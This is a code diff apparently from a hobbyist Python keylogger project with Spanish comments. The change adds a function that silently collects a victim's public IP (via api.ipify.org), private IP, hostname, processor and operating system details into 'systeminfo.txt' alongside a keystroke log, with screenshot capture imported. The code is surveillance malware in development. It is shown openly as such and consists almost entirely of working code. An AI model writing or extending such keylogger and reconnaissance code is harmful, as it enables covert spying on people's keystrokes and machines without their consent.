@@ -28,9 +28,29 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
+system_information = "systeminfo.txt"
 
 file_path = "C:\\Users\\Win 10\\Documents\\Keylogger" #cambiar ruta si no funciona 
 extend = "\\"
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip + '\n')
+        
+        except Exception:
+            f.write("No es posible obtener la IP address (most likely max query")
+        
+        f.write("Procesador: " + (platform.processor()) + '\n')
+        f.write ("Sistema: " + (platform.system()) + " " + platform.version() + '\n')
+        f.write ("Equipo: " + platform.machine() + "\n")
+        f.write ("Hostname: " + hostname + "\n")
+        f.write ("Private IP address: " + IPAddr + "\n")
+
+computer_information()
 
 count = 0
 keys = []
